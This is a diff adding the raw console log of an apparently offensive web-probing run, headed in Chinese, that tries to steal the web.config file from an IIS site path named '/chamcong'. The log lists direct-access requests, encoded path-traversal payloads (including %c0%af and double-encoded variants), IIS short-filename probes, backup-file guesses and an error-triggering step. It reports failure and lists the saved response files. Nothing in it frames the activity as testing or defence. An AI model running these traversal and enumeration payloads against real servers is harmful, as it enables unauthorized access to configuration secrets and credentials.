@@ -1,0 +1,66 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔥🔥🔥 Phase 2: 死磕获取web.config
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[1] 直接访问尝试...
+  /web.config: - (404, 1245 bytes)
+  /Web.config: - (404, 1245 bytes)
+  /WEB.CONFIG: - (404, 1245 bytes)
+  /chamcong/web.config: - (404, 1245 bytes)
+  /chamcong/Web.config: - (404, 1245 bytes)
+  /chamcong/WEB.CONFIG: - (404, 1245 bytes)
+
+[2] 路径遍历尝试...
+  /chamcong/report/../web.config: - (1245 bytes)
+  /chamcong/report/../../web.config: - (1245 bytes)
+  /chamcong/report/../../../web.config: - (1245 bytes)
+  /chamcong/report/..\web.config: - (1245 bytes)
+  /chamcong/report/..\..\web.config: - (1245 bytes)
+  /chamcong/report/%2e%2e/web.config: - (1245 bytes)
+  /chamcong/report/%2e%2e%2f%2e%2e%2fweb.config: - (1245 bytes)
+  /chamcong/report/..%252f..%252fweb.config: - (1245 bytes)
+  /chamcong/report/..%c0%af..%c0%afweb.config: - (1245 bytes)
+
+[3] IIS短文件名攻击...
+  /WEB~1.CON: 1245 bytes
+  /web~1.con: 1245 bytes
+  /chamcong/WEB~1.CON: 1245 bytes
+  /chamcong/web~1.con: 1245 bytes
+
+[4] 备份文件尝试...
+  /chamcong/web.config.bak: ⚠️  1245 bytes (可能)
+  /chamcong/web.config.old: ⚠️  1245 bytes (可能)
+  /chamcong/web.config~: ⚠️  1245 bytes (可能)
+  /chamcong/web.config.txt: ⚠️  1245 bytes (可能)
+  /chamcong/backup/web.config: ⚠️  1245 bytes (可能)
+  /backup/web.config: ⚠️  1245 bytes (可能)
+  /chamcong/web.config.2024: ⚠️  1245 bytes (可能)
+  /chamcong/web.config.back: ⚠️  1245 bytes (可能)
+
+[5] 触发错误泄露配置...
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 web.config获取结果:
+❌ 未成功
+
+📁 所有尝试的文件:
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 backup_251d76bb3710b162f0431e0b6257c3a6.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 backup_435694a939712787100fb8f4562cf1a6.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 backup_69ec3ad0b52e41ca07c2a19ae1911883.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 backup_6dc071ecd6bc79889533803f87f196ae.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 backup_8c15fac197a2623886c590b2321bce32.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 backup_bf1683bfb507b5a129e7de4f46c892e4.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 backup_bfc1fbaf5812d516c0e4bd6e65460e6d.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 backup_e425caf869c104ec3debe8a18380f5df.txt
+-rw-r--r-- 1 ubuntu ubuntu 7.7K Nov 17 16:39 error_viewstate.html
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:39 error_webconfig.html
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 trav_203d882e13312988d709859e74e96a3e.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 trav_2c9c2b75f47d584a3b01ebb0d9d907ee.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 trav_5835dd92e1514e80edbd90d36ecde5dd.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 trav_82dca858416cba304b2745c31b900cc1.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 trav_8569ed5567fd25c7d90ba1c255aae055.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 trav_8a86ccf1f2efe0a802e987663adfe525.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 trav_c00126e8452d6a8ac17431077a3fabd5.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 trav_d41d63bbbcdafd58d62a1e229177ce3e.txt
+-rw-r--r-- 1 ubuntu ubuntu 1.3K Nov 17 16:38 trav_fa552438420b73ba1946b73269f14ed2.txt
+-rw-r--r-- 1 ubuntu ubuntu 2.0K Nov 17 16:39 webconfig_attempts.txt
